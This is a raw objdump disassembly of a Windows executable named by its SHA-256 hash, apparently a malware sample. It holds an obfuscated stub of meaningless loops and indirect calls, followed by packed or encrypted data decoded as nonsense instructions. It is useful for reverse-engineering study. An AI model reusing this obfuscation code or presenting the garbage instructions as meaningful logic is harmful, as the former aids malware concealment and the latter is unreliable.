
2f32aac6a779907f9eed4dc17ade072f5123fce48eeb247d05e1e2e2218bec63.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x38
  401006:	mov    eax,0x5a3fc9e
  40100b:	movzx  ecx,BYTE PTR ds:0x42fd0d
  401012:	mov    DWORD PTR [ebp-0x20],eax
  401015:	mov    ecx,DWORD PTR [ebp-0x20]
  401018:	mov    DWORD PTR [ebp-0x24],0x4ec5
  40101f:	mov    DWORD PTR ds:0x42fd09,0x6cee
  401029:	cmp    ecx,eax
  40102b:	mov    DWORD PTR ds:0x42e11c,0x6120
  401035:	jne    0x402968
  40103b:	or     ecx,0x42d0
  401041:	mov    ax,WORD PTR [ebp-0x24]
  401045:	adc    DWORD PTR ds:0x42fcf1,edx
  40104b:	push   esi
  40104c:	and    DWORD PTR ds:0x42fcd9,0x0
  401056:	jmp    0x401068
  40105b:	mov    ecx,DWORD PTR ds:0x42fcd9
  401061:	inc    ecx
  401062:	mov    DWORD PTR ds:0x42fcd9,ecx
  401068:	cmp    DWORD PTR ds:0x42fcd9,0x1a
  40106f:	jae    0x4010b5
  401075:	cmp    DWORD PTR ds:0x42fcd9,0xf
  40107c:	jne    0x401090
  401082:	push   0x23a3
  401087:	push   DWORD PTR [ebp-0x10]
  40108a:	call   DWORD PTR ds:0x42e527
  401090:	cmp    DWORD PTR ds:0x42fcd9,0xe
  401097:	jne    0x4010aa
  40109d:	mov    ecx,DWORD PTR ds:0x42fcd9
  4010a3:	inc    ecx
  4010a4:	mov    DWORD PTR ds:0x42fcd9,ecx
  4010aa:	jmp    0x40105b
  4010af:	add    DWORD PTR ds:0x42e124,edx
  4010b5:	mov    ecx,0x8a3e
  4010ba:	xor    ax,cx
  4010bd:	sub    ecx,DWORD PTR ds:0x42e70b
  4010c3:	mov    ecx,DWORD PTR [ebp+0x8]
  4010c6:	mov    DWORD PTR ds:0x42e6fb,0x11
  4010d0:	cmp    DWORD PTR ds:0x42e6fb,0x0
  4010d7:	je     0x4011ef
  4010dd:	cmp    DWORD PTR ds:0x42e6fb,0x8
  4010e4:	jne    0x401100
  4010ea:	push   0x42e128
  4010ef:	push   DWORD PTR [ebp-0x10]
  4010f2:	push   0x671d
  4010f7:	push   DWORD PTR [ebp-0x20]
  4010fa:	call   DWORD PTR ds:0x42e2cf
  401100:	cmp    DWORD PTR ds:0x42e6fb,0x9
  401107:	jne    0x40111c
  40110d:	xor    esi,esi
  40110f:	xor    esi,DWORD PTR ds:0x42e6fb
  401115:	dec    esi
  401116:	mov    DWORD PTR ds:0x42e6fb,esi
  40111c:	mov    esi,DWORD PTR ds:0x42e6fb
  401122:	dec    esi
  401123:	mov    DWORD PTR ds:0x42e6fb,esi
  401129:	jmp    0x4010d0
  40112e:	and    DWORD PTR ds:0x42e11c,0x0
  401138:	mov    esi,DWORD PTR ds:0x42e11c
  40113e:	inc    esi
  40113f:	mov    DWORD PTR ds:0x42e11c,esi
  401145:	cmp    DWORD PTR ds:0x42e11c,0xd
  40114c:	jne    0x401160
  401152:	push   0x3999
  401157:	push   DWORD PTR [ebp-0x20]
  40115a:	call   DWORD PTR ds:0x42e52b
  401160:	cmp    DWORD PTR ds:0x42e11c,0xc
  401167:	jne    0x40117c
  40116d:	xor    esi,esi
  40116f:	add    esi,DWORD PTR ds:0x42e11c
  401175:	inc    esi
  401176:	mov    DWORD PTR ds:0x42e11c,esi
  40117c:	cmp    DWORD PTR ds:0x42e11c,0x15
  401183:	jb     0x401138
  401189:	mov    DWORD PTR ds:0x42e134,0x1a
  401193:	cmp    DWORD PTR ds:0x42e134,0x0
  40119a:	je     0x4011ef
  4011a0:	cmp    DWORD PTR ds:0x42e134,0x25
  4011a7:	jne    0x4011d5
  4011ad:	push   0x42fd7a
  4011b2:	push   DWORD PTR [ebp-0x20]
  4011b5:	push   0x4679
  4011ba:	push   0x42fd82
  4011bf:	push   0x17d1
  4011c4:	push   0x42e227
  4011c9:	push   DWORD PTR [ebp-0x14]
  4011cc:	push   DWORD PTR [ebp-0x18]
  4011cf:	call   DWORD PTR ds:0x42e44b
  4011d5:	xor    esi,esi
  4011d7:	or     esi,DWORD PTR ds:0x42e134
  4011dd:	dec    esi
  4011de:	mov    DWORD PTR ds:0x42e134,esi
  4011e4:	jmp    0x401193
  4011e9:	add    DWORD PTR ds:0x42e6fb,ecx
  4011ef:	push   edi
  4011f0:	xor    esi,esi
  4011f2:	or     esi,DWORD PTR ds:0x42fd05
  4011f8:	adc    esi,DWORD PTR ds:0x42fd09
  4011fe:	mov    DWORD PTR ds:0x42fd05,esi
  401204:	mov    edi,0x3b04
  401209:	add    ax,di
  40120c:	mov    DWORD PTR ds:0x42e703,0x17
  401216:	cmp    DWORD PTR ds:0x42e703,0x0
  40121d:	je     0x401257
  401223:	cmp    DWORD PTR ds:0x42e703,0x26
  40122a:	jne    0x401243
  401230:	push   DWORD PTR [ebp-0x10]
  401233:	push   0x42e1c6
  401238:	push   0x42e17d
  40123d:	call   DWORD PTR ds:0x42e52f
  401243:	xor    esi,esi
  401245:	or     esi,DWORD PTR ds:0x42e703
  40124b:	dec    esi
  40124c:	mov    DWORD PTR ds:0x42e703,esi
  401252:	jmp    0x401216
  401257:	movzx  eax,ax
  40125a:	not    eax
  40125c:	and    eax,DWORD PTR [ecx]
  40125e:	mov    ecx,DWORD PTR [ebp+0x8]
  401261:	mov    DWORD PTR ds:0x42fd7e,0x12
  40126b:	cmp    DWORD PTR ds:0x42fd7e,0x0
  401272:	je     0x4012b2
  401278:	cmp    DWORD PTR ds:0x42fd7e,0x22
  40127f:	jne    0x4012a0
  401285:	push   0x42e227
  40128a:	push   0x7fee
  40128f:	push   DWORD PTR [ebp-0x28]
  401292:	push   DWORD PTR [ebp-0x24]
  401295:	push   0x4b6b
  40129a:	call   DWORD PTR ds:0x42e533
  4012a0:	mov    esi,DWORD PTR ds:0x42fd7e
  4012a6:	dec    esi
  4012a7:	mov    DWORD PTR ds:0x42fd7e,esi
  4012ad:	jmp    0x40126b
  4012b2:	mov    DWORD PTR [ecx],eax
  4012b4:	mov    ecx,0x7510855
  4012b9:	mov    esi,0x32729c
  4012be:	push   ebx
  4012bf:	mov    ax,WORD PTR [ebp-0x24]
  4012c3:	movzx  eax,ax
  4012c6:	mov    DWORD PTR [ebp-0x38],eax
  4012c9:	mov    eax,DWORD PTR [ebp+0x8]
  4012cc:	mov    DWORD PTR [ebp-0x28],eax
  4012cf:	mov    DWORD PTR [ebp-0x8],0xf89c8530
  4012d6:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  4012dd:	mov    eax,0x9577
  4012e2:	jmp    0x4014ff
  4012e7:	sbb    BYTE PTR [edx-0x68cdf8d6],0xb1
  4012ee:	cdq    
  4012ef:	js     0x401291
  4012f1:	mov    ah,0x66
  4012f3:	adc    edi,0x707012b8
  4012f9:	jo     0x40136b
  4012fb:	jo     0x40137b
  4012fd:	jo     0x40136f
  4012ff:	rcl    bh,0x3d
  401302:	aad    0x39
  401304:	ror    edi,cl
  401306:	rol    eax,1
  401308:	pop    es
  401309:	push   es
  40130a:	add    ecx,DWORD PTR [edi]
  40130c:	inc    edi
  40130d:	add    cl,BYTE PTR [edi]
  40130f:	xor    ecx,DWORD PTR [edi]
  401311:	ret    0xc71a
  401314:	adc    bl,BYTE PTR [edi]
  401316:	mov    ecx,0xddb7025a
  40131b:	add    bh,ch
  40131d:	mov    ebp,0x8003c8db
  401322:	sbb    BYTE PTR [eax+0x1541a4f6],dh
  401328:	lods   eax,DWORD PTR ds:[esi]
  401329:	sar    BYTE PTR [eax+0x6fee581f],1
  40132f:	or     edx,DWORD PTR [ecx]
  401331:	sahf   
  401332:	jp     0x4012fc
  401334:	inc    edx
  401335:	lods   al,BYTE PTR ds:[esi]
  401336:	push   ebx
  401337:	sub    eax,0xad3ec6d1
  40133c:	mov    WORD PTR [ebx-0x3b],?
  40133f:	stos   DWORD PTR es:[edi],eax
  401340:	js     0x401308
  401342:	rol    DWORD PTR [ecx+0x3992c8f9],cl
  401348:	jmp    0x40137c
  40134a:	mov    ebp,ecx
  40134c:	dec    edi
  40134d:	fcomp  DWORD PTR [eax-0x656800bf]
  401353:	pop    es
  401354:	test   eax,0xed4dbddc
  401359:	sub    BYTE PTR [ebp+0x23],dl
  40135c:	mov    ah,0xec
  40135e:	pusha  
  40135f:	nop
  401360:	mov    esi,0x94c3117b
  401365:	and    esi,edx
  401367:	jmp    0x4013b9
  401369:	(bad)  
  40136a:	out    0xba,al
  40136c:	repnz in al,dx
  40136e:	xchg   esp,eax
  40136f:	xor    edi,ecx
  401371:	jbe    0x4013d8
  401373:	xlat   BYTE PTR ds:[ebx]
  401374:	and    cl,ch
  401376:	add    al,0xd9
  401378:	adc    DWORD PTR [ecx-0x68],edx
  40137b:	xor    eax,0x7a616f03
  401380:	or     dh,BYTE PTR [ecx]
  401382:	fld    QWORD PTR [eax+0x7f752a56]
  401388:	xor    BYTE PTR [edi+0xba8db0c],cl
  40138e:	pop    ebx
  40138f:	push   ebp
  401390:	(bad)  
  401392:	or     ebx,edx
  401394:	pop    esi
  401395:	fstp   DWORD PTR [ecx]
  401397:	jno    0x401329
  401399:	mov    eax,0x2b15374b
  40139e:	ja     0x4013c9
  4013a0:	sbb    al,0xd3
  4013a2:	xor    BYTE PTR [edi-0x16],cl
  4013a5:	into   
  4013a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4013a7:	push   ds
  4013a8:	lea    esp,[ebx+0x4726f5ba]
  4013ae:	out    0xf4,eax
  4013b0:	mov    esp,0xa6ee18df
  4013b5:	cmp    DWORD PTR [esi-0x1a],eax
  4013b8:	jp     0x4013f7
  4013ba:	out    dx,eax
  4013bb:	inc    eax
  4013bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4013bd:	jns    0x4013c8
  4013bf:	and    DWORD PTR [eax-0x7b7fcf6],edx
  4013c5:	dec    esi
  4013c6:	and    al,0xfb
  4013c8:	inc    ecx
  4013c9:	shl    DWORD PTR [esi+0x3ef18fb],1
  4013cf:	inc    edx
  4013d0:	adc    BYTE PTR [eax+edi*4+0x34],dl
  4013d4:	daa    
  4013d5:	fstp   st(7)
  4013d7:	dec    edx
  4013d8:	addr16 cmp al,0xb3
  4013db:	sub    ebp,eax
  4013dd:	pop    es
  4013de:	in     al,dx
  4013df:	sub    al,BYTE PTR [ebx-0x7edf696e]
  4013e5:	push   esi
  4013e6:	sbb    cl,ch
  4013e8:	iret   
  4013e9:	out    dx,eax
  4013ea:	leave  
  4013eb:	dec    ebp
  4013ec:	jge    0x401416
  4013ee:	pop    esp
  4013ef:	aaa    
  4013f0:	mov    eax,cs
  4013f2:	add    al,0x40
  4013f4:	sbb    al,0x94
  4013f6:	into   
  4013f7:	daa    
  4013f8:	push   ds
  4013f9:	sar    BYTE PTR ds:0xe05dea3b,0xab
  401400:	into   
  401401:	outs   dx,DWORD PTR ds:[esi]
  401402:	mov    ds:0x67eb7371,eax
  401407:	dec    esi
  401408:	pusha  
  401409:	adc    esp,DWORD PTR [ebx-0x7b]
  40140c:	adc    eax,0x5d24978f
  401411:	lds    edx,FWORD PTR [eax-0x3c]
  401414:	xchg   ebx,eax
  401415:	cwde   
  401416:	pop    ss
  401417:	clc    
  401418:	ins    DWORD PTR es:[di],dx
  40141a:	mov    ds,WORD PTR [ecx]
  40141c:	adc    eax,0xa34f15df
  401421:	dec    ebp
  401422:	lods   eax,DWORD PTR ds:[esi]
  401423:	jp     0x401411
  401425:	data16 jae 0x401422
  401428:	mov    dl,0x48
  40142a:	mov    edi,0x5e960a7
  40142f:	xchg   edx,ebp
  401431:	fwait
  401432:	push   esi
  401433:	out    0x55,al
  401435:	pushf  
  401436:	pop    edx
  401437:	adc    BYTE PTR ds:[ecx-0x49],al
  40143b:	jo     0x4013d6
  40143d:	push   ebp
  40143e:	bound  edi,QWORD PTR [ecx]
  401440:	add    ah,cl
  401442:	arpl   WORD PTR [edi-0x482e4905],bp
  401448:	cmp    al,BYTE PTR [ecx-0x78]
  40144b:	dec    edx
  40144c:	dec    esi
  40144d:	inc    eax
  40144e:	dec    ecx
  40144f:	mov    esi,0x4ba0b28a
  401454:	sbb    eax,0x410b3ad2
  401459:	js     0x401455
  40145b:	out    dx,al
  40145c:	sub    ch,bh
  40145e:	xchg   edx,eax
  40145f:	test   al,0xaa
  401461:	ret    
  401462:	shl    BYTE PTR [edx-0x78],0x38
  401466:	mov    WORD PTR [ebx],gs
  401468:	fimul  WORD PTR [esi]
  40146a:	ins    BYTE PTR es:[edi],dx
  40146b:	mov    dl,BYTE PTR [ebp+0x46d0927c]
  401471:	mov    WORD PTR [eax+0x37],cs
  401474:	sub    BYTE PTR [esi],0xe8
  401477:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401478:	jo     0x4014db
  40147a:	(bad)  [ebp-0x57]
  40147d:	mov    al,ds:0xcecc81b4
  401482:	jl     0x401452
  401484:	sbb    eax,0xc7264168
  401489:	pop    edx
  40148a:	pop    ss
  40148b:	and    BYTE PTR [ecx+esi*2+0x6e],dl
  40148f:	arpl   bx,si
  401491:	bound  edx,QWORD PTR [eax-0x2a]
  401494:	loop   0x4014a0
  401496:	or     al,0x73
  401498:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401499:	scas   al,BYTE PTR es:[edi]
  40149a:	or     eax,DWORD PTR [edx+0x53]
  40149d:	pop    edi
  40149e:	pushf  
  40149f:	imul   ebx,DWORD PTR [ebx-0x25403f52],0x1f
  4014a6:	mov    eax,ds:0xd5078f06
  4014ab:	ss push ebp
  4014ad:	and    cl,BYTE PTR ds:0xf90c474b
  4014b3:	dec    ebx
  4014b4:	lods   eax,DWORD PTR ds:[esi]
  4014b5:	dec    ebx
  4014b6:	arpl   WORD PTR [edx+ebp*2+0x476b01e5],di
  4014bd:	cdq    
  4014be:	(bad)  [edi-0x493105c]
  4014c4:	xor    dl,dl
  4014c6:	pop    ds
  4014c7:	retf   
  4014c8:	xor    eax,DWORD PTR [si]
  4014cb:	outs   dx,BYTE PTR ds:[esi]
  4014cc:	xchg   esi,eax
  4014cd:	mov    ds:0xa5e8b943,ax
  4014d3:	push   eax
  4014d4:	jle    0x401486
  4014d6:	jl     0x4014c1
  4014d8:	rol    ebp,cl
  4014da:	cs popa 
  4014dc:	mov    esi,0x94d618d3
  4014e1:	xchg   esi,eax
  4014e2:	push   0x4bf05758
  4014e7:	mov    edx,0x5f6249f2
  4014ec:	xchg   esi,eax
  4014ed:	cmc    
  4014ee:	pop    esi
  4014ef:	push   ss
  4014f0:	retf   0x9d35
  4014f3:	jae    0x4014e4
  4014f5:	add    edx,DWORD PTR [ecx]
  4014f7:	mov    ah,0xa4
  4014f9:	adc    BYTE PTR [edi],al
  4014fb:	and    esi,DWORD PTR [eax-0x7699e0db]
  401501:	inc    ebp
  401502:	cld    
  401503:	jmp    0x401720
  401508:	clc    
  401509:	icebp  
  40150a:	mov    esp,0xb8b16984
  40150f:	icebp  
  401510:	ficomp DWORD PTR [edx-0x7636e013]
  401516:	mov    bh,0x56
  401518:	jo     0x401598
  40151a:	jo     0x40158c
  40151c:	jo     0x40159c
  40151e:	jo     0x401590
  401520:	inc    edx
  401521:	repnz add DWORD PTR [eax],edx
  401524:	cld    
  401525:	scas   eax,DWORD PTR es:[edi]
  401526:	shl    esi,1
  401528:	jg     0x401521
  40152a:	sub    eax,0xeafb7c02
  40152f:	pop    ss
  401530:	lea    ecx,[edx-0xdf04d8d]
  401536:	nop
  401537:	jne    0x4014ff
  401539:	xor    eax,0xeaad2206
  40153e:	mov    dl,0x5a
  401540:	jne    0x401572
  401542:	mov    ds:0x7e320f3b,al
  401547:	(bad)  
  401549:	lds    ebx,FWORD PTR [ebx+0xfd1c65b]
  40154f:	aaa    
  401550:	sahf   
  401551:	push   eax
  401552:	mov    cl,0x82
  401554:	out    dx,al
  401555:	scas   eax,DWORD PTR es:[edi]
  401556:	mov    esp,0x2d64c051
  40155b:	dec    edx
  40155c:	ror    DWORD PTR [ecx],0x64
  40155f:	jmp    0x37759297
  401564:	test   BYTE PTR [ebx+0x70],bl
  401567:	retf   
  401568:	jmp    0x4015d7
  40156a:	cmp    eax,esi
  40156c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40156d:	je     0x4015c5
  40156f:	jmp    0x90bcdf47
  401574:	(bad)  
  401575:	jecxz  0x40155d
  401577:	cmc    
  401578:	clc    
  401579:	mov    esp,0x18b0fe7e
  40157e:	mov    BYTE PTR [ebp+0x40],0x37
  401582:	in     al,0xc8
  401584:	aad    0x4d
  401586:	test   al,0xe6
  401588:	retf   
  401589:	or     bl,BYTE PTR cs:[ebx+0xc42e160]
  401590:	or     BYTE PTR [esi-0x61011918],ah
  401596:	int3   
  401597:	std    
  401598:	mov    fs,WORD PTR [eax+0x1e0b9164]
  40159e:	push   0x4b6b1225
  4015a3:	hlt    
  4015a4:	bnd jp 0x4015ab
  4015a7:	mov    edi,0x22694c2
  4015ac:	test   al,0xc8
  4015ae:	iret   
  4015af:	call   0x9925:0x1fce5821
  4015b6:	and    al,0x10
  4015b8:	add    dh,BYTE PTR [ecx-0x3f]
  4015bb:	cmp    ah,0x84
  4015be:	push   cs
  4015bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4015c0:	imul   BYTE PTR [eax+eiz*1-0x43]
  4015c4:	test   al,0x1c
  4015c6:	pop    edx
  4015c7:	ja     0x4015b9
  4015c9:	ret    
  4015ca:	rcl    bh,cl
  4015cc:	jnp    0x401647
  4015ce:	scas   eax,DWORD PTR es:[edi]
  4015cf:	jne    0x40162f
  4015d1:	lods   al,BYTE PTR ds:[esi]
  4015d2:	(bad)  
  4015d4:	or     BYTE PTR [ecx+0x69],cl
  4015d7:	jecxz  0x4015fe
  4015d9:	pop    ds
  4015da:	in     eax,dx
  4015db:	adc    al,0xb4
  4015dd:	sub    al,BYTE PTR ss:[ecx]
  4015e0:	int3   
  4015e1:	xchg   edx,eax
  4015e2:	cli    
  4015e3:	cmp    bl,0x28
  4015e6:	ret    
  4015e7:	sbb    al,0x7b
  4015e9:	mov    eax,0x9560e7e0
  4015ee:	out    0xf0,eax
  4015f0:	leave  
  4015f1:	loope  0x4015be
  4015f3:	xchg   BYTE PTR [edi+edi*2],dh
  4015f6:	dec    esp
  4015f7:	sub    al,0x9a
  4015f9:	neg    BYTE PTR fs:[esi+0x7f]
  4015fd:	popf   
  4015fe:	popf   
  4015ff:	clc    
  401600:	hlt    
  401601:	adc    al,0xd0
  401603:	xor    dl,al
  401605:	jbe    0x4015e6
  401607:	test   DWORD PTR [ecx-0x3cd77f79],edx
  40160d:	sbb    esp,ebp
  40160f:	(bad)  
  401610:	(bad)  
  401612:	xchg   BYTE PTR [eax+0x2],dl
  401615:	inc    esi
  401616:	jp     0x401689
  401618:	daa    
  401619:	cmp    al,0xeb
  40161b:	outs   dx,BYTE PTR ds:[esi]
  40161c:	popf   
  40161d:	test   eax,0x6a3be0bb
  401622:	jp     0x4015f4
  401624:	push   ecx
  401625:	mov    eax,0x478a58a3
  40162a:	jg     0x401655
  40162c:	mov    ds:0x1adba284,eax
  401631:	xchg   ebp,eax
  401632:	push   edi
  401633:	lds    esp,FWORD PTR [ebp-0x5f0736bf]
  401639:	add    DWORD PTR [eax+0x3f63f28d],ebp
  40163f:	fld    QWORD PTR [eax]
  401641:	ss stc 
  401643:	pop    eax
  401644:	test   eax,0x26241393
  401649:	outs   dx,DWORD PTR ds:[esi]
  40164a:	shr    ebp,cl
  40164c:	ds push ss
  40164e:	into   
  40164f:	jmp    0x42ce067b
  401654:	repz fiadd DWORD PTR [ecx-0x3e273d4c]
  40165b:	pop    edi
  40165c:	xchg   ecx,eax
  40165d:	xor    al,0xcb
  40165f:	popa   
  401660:	mov    bh,0x59
  401662:	mov    bl,0x76
  401664:	sub    ebp,edi
  401666:	sbb    eax,0xd99b7297
  40166b:	daa    
  40166c:	dec    ecx
  40166d:	ds cmove ebx,ebp
  401671:	fimul  WORD PTR [eax+0x24359fba]
  401677:	mov    al,ds:0x52168717
  40167c:	cs inc ebp
  40167e:	popa   
  40167f:	add    bl,dl
  401681:	jnp    0x4016d2
  401683:	adc    DWORD PTR [ebp-0x5b],edx
  401686:	hlt    
  401687:	lock sar DWORD PTR fs:[eax+edx*4+0x54],cl
  40168d:	inc    eax
  40168e:	push   ds
  40168f:	in     al,dx
  401690:	or     eax,0x70f4ad33
  401695:	sub    esp,DWORD PTR ds:[esp+esi*8]
  401699:	cmp    BYTE PTR [ecx],bl
  40169b:	fnsave [esi-0x1100aef7]
  4016a1:	mov    esp,0x8aadce7c
  4016a6:	mov    eax,ds:0xf8113d32
  4016ab:	and    esi,DWORD PTR [esi-0x24a558c6]
  4016b1:	mov    dl,0xfc
  4016b3:	push   0x72
  4016b5:	cmp    DWORD PTR [edx+0x74],0x82359d31
  4016bc:	ret    
  4016bd:	dec    esp
  4016be:	pop    ebp
  4016bf:	cmc    
  4016c0:	xor    bh,0x4f
  4016c3:	jp     0x4016b4
  4016c5:	jns    0x401736
  4016c7:	out    0xcd,eax
  4016c9:	jns    0x40167a
  4016cb:	call   0x275f:0xbf3ffd77
  4016d2:	sub    edi,esi
  4016d4:	pop    ebx
  4016d5:	stc    
  4016d6:	pop    ss
  4016d7:	mov    ah,ch
  4016d9:	xchg   ebx,eax
  4016da:	and    al,0x67
  4016dc:	add    bh,BYTE PTR [ebx+0x35]
  4016df:	jmp    0x50998622
  4016e4:	push   cs
  4016e5:	add    al,0x96
  4016e7:	or     esp,DWORD PTR [eax+esi*4-0x1bf6982d]
  4016ee:	mov    al,0x35
  4016f0:	jne    0x401727
  4016f2:	jne    0x40172b
  4016f4:	sub    al,0x33
  4016f6:	pushf  
  4016f7:	(bad)  [eax]
  4016f9:	or     eax,0x489a14e
  4016fe:	bound  edi,QWORD PTR [eax]
  401700:	mov    edi,0x9b37edee
  401705:	xchg   esp,eax
  401706:	dec    esi
  401707:	lods   eax,DWORD PTR ds:[esi]
  401708:	ss ds outs dx,BYTE PTR ss:[esi]
  40170c:	push   DWORD PTR [ebp+0x3dc6a0ce]
  401712:	les    edi,FWORD PTR [ebx-0x48e8050a]
  401718:	jnp    0x401719
  40171a:	sbb    al,0xcc
  40171c:	pop    edx
  40171d:	imul   edx,ebx,0x6a
  401720:	lea    eax,[ebp-0x30]
  401723:	mov    DWORD PTR [ebp-0x34],eax
  401726:	mov    eax,DWORD PTR [ebp-0x28]
  401729:	mov    DWORD PTR [ebp-0x2c],eax
  40172c:	lea    eax,[ebp-0x18]
  40172f:	jmp    0x40194c
  401734:	dec    ebp
  401735:	iret   
  401736:	lods   eax,DWORD PTR ds:[esi]
  401737:	dec    ebx
  401738:	lods   eax,DWORD PTR ds:[esi]
  401739:	imul   ebp,DWORD PTR [ecx-0x37],0x8e1037e1
  401740:	xchg   edi,eax
  401741:	mov    es,WORD PTR [eax-0x23]
  401744:	jo     0x4017c2
  401746:	jo     0x4017b8
  401748:	jo     0x4017c8
  40174a:	jo     0x4017bc
  40174c:	cmp    DWORD PTR [ecx],ebp
  40174e:	aad    0xa3
  401750:	popf   
  401751:	xor    DWORD PTR [ebp-0x3c46cecb],edi
  401757:	les    ebx,FWORD PTR [esi-0x5e]
  40175a:	bound  ebx,QWORD PTR [ecx-0x1e]
  40175d:	jae    0x40179c
  40175f:	aam    0xe5
  401761:	fcomp  DWORD PTR [edx-0x4d]
  401764:	inc    ebx
  401765:	xchg   ebp,eax
  401766:	mov    bl,0xb8
  401768:	and    DWORD PTR [ebp+0x136a68aa],edx
  40176e:	retf   0x771f
  401771:	pop    ebp
  401772:	int3   
  401773:	xchg   edi,eax
  401774:	and    ecx,edi
  401776:	in     al,dx
  401777:	ror    BYTE PTR [eax-0x5f1873ef],1
  40177d:	jp     0x4017c5
  40177f:	hlt    
  401780:	jmp    0xe32f72e6
  401785:	mov    ds:0xca842252,al
  40178a:	push   ebx
  40178b:	out    0x8,eax
  40178d:	adc    eax,edi
  40178f:	cmc    
  401790:	dec    ebp
  401791:	ins    DWORD PTR es:[edi],dx
  401792:	pop    edi
  401793:	jmp    0x18b36281
  401798:	sbb    al,0x6f
  40179a:	mov    ecx,0xde7d5b6e
  40179f:	ror    BYTE PTR [ecx-0x61],1
  4017a2:	jmp    0x5706:0x1da347a3
  4017a9:	cmp    al,0xbe
  4017ab:	and    eax,0x7c04eb0a
  4017b0:	sub    eax,DWORD PTR [edx+0x72]
  4017b3:	imul   ebp,ebp,0x4e
  4017b6:	hlt    
  4017b7:	and    eax,0xc987aa85
  4017bc:	(bad)  
  4017bd:	sbb    eax,0x429116cd
  4017c2:	mov    esp,0x9df68058
  4017c7:	sbb    ch,BYTE PTR [ecx+ebp*1]
  4017ca:	sub    ah,BYTE PTR [eax]
  4017cc:	scas   al,BYTE PTR es:[edi]
  4017cd:	jg     0x40184b
  4017cf:	fld    TBYTE PTR [ebx]
  4017d1:	mov    edi,0xf34cf26
  4017d6:	jmp    0xd82e:0x29909cc8
  4017dd:	push   eax
  4017de:	aas    
  4017df:	in     eax,0x52
  4017e1:	or     DWORD PTR [ebx+0x62],edx
  4017e4:	mov    al,0x5e
  4017e6:	and    ebx,edi
  4017e8:	pop    es
  4017e9:	or     eax,0x6c1c8f92
  4017ee:	push   cs
  4017ef:	pop    ebp
  4017f0:	cmp    BYTE PTR [ebp-0x7848b2f3],0x8e
  4017f7:	sbb    al,0x7b
  4017f9:	push   esi
  4017fa:	in     al,0xae
  4017fc:	sub    ch,dl
  4017fe:	pop    ebx
  4017ff:	adc    al,0xe5
  401801:	xchg   esi,eax
  401802:	adc    al,0x32
  401804:	or     edx,DWORD PTR [ecx+0x7cd614c6]
  40180a:	sub    bl,BYTE PTR [ecx-0x65c45b60]
  401810:	and    DWORD PTR [eax+eax*2+0x32],ecx
  401814:	aad    0xae
  401816:	ret    
  401817:	(bad)  
  401818:	fchs   
  40181a:	cmp    ah,BYTE PTR gs:[ebx]
  40181d:	lahf   
  40181e:	sub    eax,0x50a44461
  401823:	sub    al,0xe1
  401825:	retf   0xbd6b
  401828:	pop    ss
  401829:	sar    BYTE PTR [eax+0x3fa98400],cl
  40182f:	(bad)  
  401830:	outs   dx,DWORD PTR ds:[esi]
  401831:	pcmpgtd mm6,mm5
  401834:	sbb    DWORD PTR [ecx-0x21],ebp
  401837:	mov    ds:0x3e62a4d,al
  40183c:	xchg   DWORD PTR [eax-0xbf205dd],eax
  401842:	fldcw  WORD PTR [edx]
  401844:	arpl   di,dx
  401846:	mov    bh,bl
  401848:	or     ah,BYTE PTR [edi-0xacacc5e]
  40184e:	fdivr  DWORD PTR [ebx+0x50]
  401851:	dec    ebx
  401852:	idiv   DWORD PTR [esi-0x53bc774d]
  401858:	sub    BYTE PTR [ecx],ch
  40185a:	cmp    bh,BYTE PTR [edi]
  40185c:	jmp    0x4017e8
  40185e:	inc    eax
  40185f:	(bad)
  401863:	(bad)  
  401864:	ja     0x520055c8
  40186a:	imul   esi,DWORD PTR [esi-0x26],0xe36bcc0
  401871:	pop    ds
  401872:	and    esp,0x70
  401875:	cmp    DWORD PTR [ebp+0x35],ebx
  401878:	or     al,0xa
  40187a:	adc    ah,BYTE PTR [esi]
  40187c:	cmc    
  40187d:	into   
  40187e:	stos   BYTE PTR es:[edi],al
  40187f:	and    dl,dh
  401881:	dec    ecx
  401882:	mov    dh,0x4e
  401884:	add    BYTE PTR [ebx+0x5f64c142],ah
  40188a:	jle    0x4018ae
  40188c:	in     al,dx
  40188d:	(bad)  
  40188e:	mov    cl,0xba
  401890:	cmp    ebx,DWORD PTR [ebx-0x4dfc1c62]
  401896:	(bad)  
  401897:	ins    BYTE PTR es:[edi],dx
  401898:	adc    eax,DWORD PTR [ebx+0x754bc7de]
  40189e:	call   0xba14f3ab
  4018a3:	je     0x4018f2
  4018a5:	mov    ecx,0x8df6dd08
  4018aa:	dec    esp
  4018ab:	fcom   st(0)
  4018ad:	addr16 adc ebx,edx
  4018b0:	jl     0x401897
  4018b2:	push   esi
  4018b3:	test   DWORD PTR [ebx+0x1a],ebx
  4018b6:	(bad)  
  4018b7:	out    dx,eax
  4018b8:	les    ebp,FWORD PTR [ecx-0x3c3867c2]
  4018be:	jnp    0x40192c
  4018c0:	cmp    BYTE PTR [edi],0x7b
  4018c3:	xchg   esp,eax
  4018c4:	inc    esp
  4018c5:	rcr    DWORD PTR [edx],1
  4018c7:	jbe    0x40186c
  4018c9:	jg     0x4018d0
  4018cb:	fdivr  st,st(1)
  4018cd:	nop
  4018ce:	jns    0x401907
  4018d0:	ins    BYTE PTR es:[edi],dx
  4018d1:	hlt    
  4018d2:	and    eax,0x90e0d52b
  4018d7:	(bad)  
  4018d8:	pushf  
  4018d9:	sbb    eax,0x6b9c4955
  4018de:	xchg   bp,ax
  4018e0:	pop    ecx
  4018e1:	cmp    al,0xdc
  4018e3:	adc    eax,0xe7955be3
  4018e8:	mov    ds:0xcb8f5571,al
  4018ed:	mov    ah,0xdd
  4018ef:	test   al,0xe3
  4018f1:	lods   al,BYTE PTR ds:[esi]
  4018f2:	pop    esp
  4018f3:	imul   DWORD PTR [eax]
  4018f5:	in     al,dx
  4018f6:	imul   ebx,DWORD PTR [ebp+0x36],0xffffff91
  4018fa:	or     DWORD PTR [ebx],ebp
  4018fc:	push   esi
  4018fd:	sub    DWORD PTR [ebx],0x10633e3a
  401903:	jge    0x40194e
  401905:	or     ah,al
  401907:	stc    
  401908:	lods   eax,DWORD PTR fs:[esi]
  40190a:	stos   DWORD PTR es:[edi],eax
  40190b:	pop    ds
